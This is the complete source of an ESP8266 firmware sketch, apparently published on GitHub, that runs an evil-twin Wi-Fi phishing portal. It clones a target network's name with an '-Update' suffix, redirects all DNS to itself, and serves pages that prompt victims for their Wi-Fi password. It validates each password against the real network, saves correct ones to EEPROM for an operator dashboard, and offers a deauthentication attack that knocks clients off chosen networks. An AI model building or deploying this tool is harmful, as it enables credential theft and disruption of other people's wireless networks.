//////////////////////////////////////////////////
//            Made By HEINZGUENTER              //
//github.com/heinzguenter/ESP8266-Captive-Portal//
//////////////////////////////////////////////////

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

#include "portal_pages.h"
#include "dashboard.h"
#include "deauther.h"
#include "favicon.h"

// Default SSID name
#define SSID_NAME "Portal-Update" //default SSID

// Init system settings
#define DNS_PORT 53 //Port for the DNS Server
IPAddress APIP(192, 168, 1, 1); // The ip of the esp8266 itself where you can acces the dashboard and index page

String allPass; //Contains all Passwords 
String currentSSID; //Current SSID
String targetSSID = "Portal";
String indexLang = "EN"; //Index Page Language(You can change the Default Language Here)
bool validate = true; //contains if the password should be validated
String lastPass; //conatines the last checked password

// For storing passwords in EEPROM.
#define initialCheckLocation 20 // Location to check whether the ESP is running for the first time.
#define passStart 30            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

void LED(bool light) { // Turns the LED on(true) and off(false).
  if (light == true){digitalWrite(LED_BUILTIN, LOW);} 
  else {digitalWrite(LED_BUILTIN, HIGH);}
}

//handles the page that is displayed after password entry
void handleFixing() {  webServer.send(200, "text/html", Fixing(indexLang, favicon(), targetSSID)); }

//handles the default password entry page
void handleIndex(){  webServer.send(200, "text/html", Index(indexLang, favicon(), targetSSID)); }

//handles the page when a wrong password is entered
void handleWrongPass(){ webServer.send(200, "text/html", wrongPass(indexLang, favicon(), targetSSID)); }

void handleDashboard() { // handles the dashboard page
  webServer.send(200, "text/html", dashboard(indexLang, favicon(), targetSSID, allPass, WiFi.scanNetworks(), validate));

  if (webServer.hasArg("led_off")){ LED(false); } //calls the led off function if the button on the dashboard is pressed
}

void handlePost(){
  Serial.printf("\n=====PasswordEntry=====\n\n");
  String pass = webServer.arg("wifiPassword"); //Getting the value of the Password field

  int i = 0;
  if(lastPass == pass){ //check if the entered password is the same as the last entered password
    if (WiFi.status() == 3 || validate == false){ webServer.sendHeader("Location", "/restarting", true); Serial.printf("alredy checked: Correct Password\n"); } //if it was correct send to restarting page
    if (WiFi.status() == 6 && validate == true) { webServer.sendHeader("Location", "/incorrectPass", true); Serial.printf("alredy checked: Wrong Password\n"); } // if it was incorrect send to wrong password page
    if (WiFi.status() != 6 && WiFi.status() != 3) { webServer.sendHeader("Location", "/incorrectPass", true); }
    webServer.send(302);
  } else {

    if (validate == true){ //if validation is turned try to connect to the wifi that is beeing validated
      if (WiFi.status() == 3){ WiFi.disconnect();}
      WiFi.begin(targetSSID, pass);
      Serial.print("Connnecting to: " + targetSSID + ", " + pass + "\n");
    
      int time = millis();
      while (WiFi.status() != 3 && WiFi.status() != 4 && millis() - time < 10 * 1000){ delay(250); i++; } //wait until the wifi is conected, the wrong password status is set or the timeout triggered
    }

    if (WiFi.status() == 3 || validate == false){ //if conected or validation is turned off start password saving and redirecting to the restarting page
      Serial.printf("Password Correct\n");
      webServer.sendHeader("Location", "/restarting", true);
      webServer.send(302);
      
      lastPass = pass;

      pass = "<tr><td>" + pass + "</td><td>" + millis()/1000 + "</td></tr>"; // Adding password and seconds after bootup in a ordered list.
      allPass += pass;                       // Updating the full passwords.

      // Storing passwords to EEPROM.
      for (int i = 0; i <= pass.length(); ++i){
        EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
      } 

      passEnd += pass.length(); // Updating end position of passwords in EEPROM.
      EEPROM.write(passEnd, '\0');
      EEPROM.commit();

      LED(true);
    } else { //if password was not correct redirect to the wrong password page
      Serial.printf("Password Incorrect\n");
      lastPass = pass;
    
      webServer.sendHeader("Location", "/incorrectPass", true);
      webServer.send(302);
    }
  }
  Serial.print("WiFi Status : " +  String(WiFi.status()) + "\n");
  Serial.print("It Took: " + String(i/4) + " seconds\n"); //print time it took to connect/get wrong password status
  Serial.printf("\n=====PasswordEntry=====\n\n");
}

void postSSID() {
  Serial.printf("\n=====NewSSID=====\n\n");

  String postedSSID = webServer.arg("ssid");

  targetSSID = postedSSID;
  postedSSID += "-Update"; //if you want to change this you have to edit the number of chars that are beeing subtracted in the setup where the target ssid is set
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();

  webServer.sendHeader("Location", "/dashboard", true);
  webServer.send(302);

  WiFi.softAPdisconnect(true);
  delay(2000);
  WiFi.softAP(postedSSID);
  currentSSID = postedSSID;

  Serial.print("SSID changed to: " + currentSSID + "\n");

  Serial.printf("\n=====NewSSID=====\n\n");
}

void clearPass(){ //deletes all stored passwords
  Serial.printf("\n=====PasswordCleaner=====\n\n");

  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  Serial.printf("All passwords deleted\n");
  webServer.sendHeader("Location", "/dashboard", true);
  webServer.send(302);

  Serial.printf("\n=====PasswordCleaner=====\n\n");
}

void handleLang(){ //change the language for the pages the user will see
  Serial.printf("\n=====Language=====\n\n");

  indexLang = webServer.arg("lang");
  Serial.print("Language changed to: " + indexLang + "\n");
  webServer.sendHeader("Location", "/dashboard", true);
  webServer.send(302);

  Serial.printf("\n=====Language=====\n\n");
}

void handleDeauth(){ //gets the target and duration for the deauth attack and sends the data to the deauth function
  Serial.printf("\n=====Deauther=====\n\n");

  int target = webServer.arg("target").toInt(); 

  Serial.print("\nTrying to Deauth: " + WiFi.BSSIDstr(target) + "(" + String(target) + "), on channel: " + WiFi.channel(target) + ", for: " + webServer.arg("duration") + " seconds\n");
  
  deauth(WiFi.channel(target), WiFi.BSSID(target), webServer.arg("duration").toInt());

  webServer.sendHeader("Location", "/dashboard", true);
  webServer.send(302);

  Serial.printf("\n=====Deauther=====\n\n");
}

void setValidate(){
  Serial.printf("\n=====SetValidation=====\n\n");

  if (webServer.arg("validate") == "on"){ validate = true; Serial.printf("Validate set to true\n");} 
  else { validate = false; Serial.printf("Validate set to false\n");}

  webServer.sendHeader("Location", "/dashboard", true);
  webServer.send(302);
  Serial.printf("\n=====SetValidation=====\n\n");
}

void setup(){
  Serial.begin(115200);

  Serial.printf("");
  Serial.printf("\n=====Setup=====\n\n");

  bootTime = lastActivity = millis();
  EEPROM.begin(512);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }
  
  WiFi.mode(WIFI_AP_STA);
  Serial.printf("Soft ap config: %s\n", WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0)) ? "Sucessfully!" : "Failed!");

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;
  
  Serial.printf("Soft ap setup: %s\n", WiFi.softAP(currentSSID) ? "Sucessfully!" : "Failed!");
  targetSSID = currentSSID.substring(0, currentSSID.length() - 7);
  Serial.print("Target SSID: " + targetSSID + "\n");
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)

  webServer.on("/", handleIndex);
  webServer.on("/post", handlePost);
  webServer.on("/restarting", handleFixing);
  webServer.on("/dashboard", handleDashboard);
  webServer.on("/clearPass", clearPass);
  webServer.on("/language", handleLang);
  webServer.on("/deauth", handleDeauth);
  webServer.on("/incorrectPass", handleWrongPass);
  webServer.on("/ssid", postSSID);
  webServer.on("/validate", setValidate);
  
  webServer.onNotFound(handleIndex);
  webServer.begin();

  // Enable the built-in LED
  pinMode(LED_BUILTIN, OUTPUT);
  LED(false);

  Serial.printf("\n=====Setup=====\n\n");
}

void loop(){
  dnsServer.processNextRequest();
  webServer.handleClient();
}
